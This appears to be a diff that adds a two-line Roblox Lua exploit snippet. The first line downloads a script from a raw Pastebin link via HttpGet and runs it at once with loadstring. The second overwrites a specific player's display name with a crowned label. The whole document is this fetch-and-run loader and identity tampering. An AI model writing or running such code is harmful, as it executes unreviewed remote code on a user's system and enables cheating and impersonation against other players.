@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/jkz6u8Se"))()
+game.Players.hahayoudie_d.Character.Humanoid.DisplayName = "[👑] ayebullet"
